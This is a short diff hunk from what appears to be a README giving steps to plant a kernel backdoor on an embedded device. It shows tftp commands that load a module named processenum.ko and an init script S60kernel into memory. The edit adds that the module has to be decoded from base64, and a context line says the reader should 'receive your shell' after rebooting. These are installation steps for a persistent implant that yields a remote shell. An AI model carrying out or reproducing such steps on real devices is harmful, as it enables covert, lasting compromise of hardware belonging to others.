@@ -18,7 +18,7 @@ now reboot the device, let it boot and upon success you should receive your shel
 
 ### FOR kernel backdoor:
 
-same steps as above in addition to the below changes:
+same steps as above in addition to the below changes (the `.ko` file must be converted back from b64):
 ```
 tftp 0x63000000 processenum.ko
 tftp 0x65000000 S60kernel
